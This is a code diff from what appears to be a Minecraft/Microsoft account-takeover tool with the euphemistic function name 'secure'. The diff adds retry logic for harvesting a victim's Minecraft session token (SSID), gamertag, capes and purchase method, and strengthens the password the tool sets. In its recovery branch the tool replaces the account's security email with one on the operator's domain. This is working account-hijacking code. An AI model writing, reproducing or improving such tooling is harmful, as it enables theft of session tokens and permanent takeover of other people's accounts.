@@ -34,9 +34,80 @@ from minecraft.get_capes import get_capes
 from minecraft.get_xbl import get_xbl
 
 from database.database import DBConnection
+import asyncio
 import httpx
 import uuid
 import json
+import logging
+
+log = logging.getLogger(__name__)
+
+
+async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> str:
+    """Populate account_info['minecraft']. Returns outcome:
+    'ok' | 'no_java' | 'no_mc' | 'transient'
+    """
+    print("[~] - Checking Minecraft Account")
+    XBLResponse = await get_xbl(session)
+
+    if not XBLResponse:
+        print("[x] - Failed to get XBL (retryable / no Xbox profile)")
+        account_info["minecraft"]["name"] = "No Minecraft"
+        return "transient"
+
+    print("[+] - Got XBL (Has Xbox Profile)")
+    xbl = XBLResponse["xbl"]
+    gtg = XBLResponse.get("gtg")
+    if gtg:
+        account_info["minecraft"]["gamertag"] = gtg
+
+    ssid = await get_ssid(xbl)
+    if not ssid:
+        # XBL worked but SSID failed — often rate-limit / auth race, not "no MC"
+        print("[x] - Failed to get SSID (retryable)")
+        account_info["minecraft"]["name"] = "No Minecraft"
+        return "transient"
+
+    print("[+] - Got SSID! (Has Minecraft)")
+    account_info["minecraft"]["SSID"] = ssid
+
+    try:
+        capes = await get_capes(ssid)
+    except Exception:
+        capes = []
+    if capes:
+        account_info["minecraft"]["capes"] = ", ".join(
+            i.get("alias", i.get("id", "Unknown")) for i in capes
+        )
+        print("[+] - Got capes")
+    else:
+        account_info["minecraft"]["capes"] = "No capes"
+
+    profile = await get_profile(ssid)
+    if profile:
+        print("[+] - Got profile (Has Minecraft Java)")
+        account_info["minecraft"]["name"] = profile
+
+        try:
+            usernameInfo = await get_username_info(ssid)
+        except Exception:
+            usernameInfo = False
+        if not usernameInfo:
+            account_info["minecraft"]["uchange"] = "Yes"
+        else:
+            account_info["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
+    else:
+        print("[x] - No Java profile (Bedrock/Game Pass only)")
+        account_info["minecraft"]["name"] = f"{gtg} (No Java)" if gtg else "Owned — No Java Profile"
+        account_info["minecraft"]["uchange"] = "N/A"
+
+    method = await get_method(ssid)
+    if method:
+        account_info["minecraft"]["method"] = method
+        print("[+] - Got purchase method")
+
+    return "ok" if profile else "no_java"
+
 
 async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, account_info: dict):
     # Main file where all processes to securing the account occur
@@ -56,61 +127,20 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     t = await get_t(session)
     print(f"[+] - Got T ({t})")
 
-    # Minecraft checking
-    print("[~] - Checking Minecraft Account")
-    XBLResponse = await get_xbl(session)
-
-    if XBLResponse:
-        print("[+] - Got XBL (Has Xbox Profile)")
-
-        xbl = XBLResponse["xbl"]
-        gtg = XBLResponse.get("gtg")
-        if gtg:
-            account_info["minecraft"]["gamertag"] = gtg
-
-        ssid = await get_ssid(xbl)
-
-        if ssid:
-            print("[+] - Got SSID! (Has Minecraft)")
-            account_info["minecraft"]["SSID"] = ssid
-
-            try:
-                capes = await get_capes(ssid)
-            except Exception:
-                capes = []
-            if capes:
-                account_info["minecraft"]["capes"] = ", ".join(
-                    i.get("alias", i.get("id", "Unknown")) for i in capes
-                )
-                print(f"[+] - Got capes")
-            else:
-                account_info["minecraft"]["capes"] = "No capes"
-
-            profile = await get_profile(ssid)
-            if profile:
-                print(f"[+] - Got profile (Has Minecraft Java)")
-                account_info["minecraft"]["name"] = profile
-
-                usernameInfo = await get_username_info(ssid)
-                if not usernameInfo:
-                    account_info["minecraft"]["uchange"] = "Yes"
-                else:
-                    account_info["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
-            else:
-                print("[x] - No Java profile (Bedrock/Game Pass only)")
-                account_info["minecraft"]["name"] = f"{gtg} (No Java)" if gtg else "Owned — No Java Profile"
-                account_info["minecraft"]["uchange"] = "N/A"
-
-            method = await get_method(ssid)
-            if method:
-                account_info["minecraft"]["method"] = method
-                print(f"[+] - Got purchase method")
+    # Minecraft checking — retry when XBL/SSID fail (rate limit / parse race)
+    mc_attempts = 3
+    for attempt in range(1, mc_attempts + 1):
+        outcome = await _check_minecraft(session, account_info)
+        if outcome != "transient":
+            break
+        if attempt < mc_attempts:
+            delay = 3.0 * attempt
+            print(f"[~] - MC check inconclusive (attempt {attempt}/{mc_attempts}), retrying in {delay:.0f}s...")
+            log.warning("MC check transient failure attempt %s/%s — sleeping %.1fs", attempt, mc_attempts, delay)
+            await asyncio.sleep(delay)
         else:
-            print("[x] - Failed to get SSID")
-
-    else:
-        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
-        account_info["minecraft"]["name"] = "No Minecraft"
+            print("[x] - MC check still failed after retries — marking No Minecraft")
+            account_info["minecraft"]["name"] = "No Minecraft"
 
     # Gets account info via microsofts API
     subscriptions = await get_subscriptions(session, verification_tokens["home"])
@@ -218,7 +248,8 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
             if recovery:
 
                 security_email = uuid.uuid4().hex[:16]
-                password = uuid.uuid4().hex[:12]
+                from securing.utils.security.password_gen import generate_ms_password
+                password = generate_ms_password(16)
 
                 security_email = f"{security_email}@{domain}"
                 print(f"[+] - Generated Security Email ({security_email})")
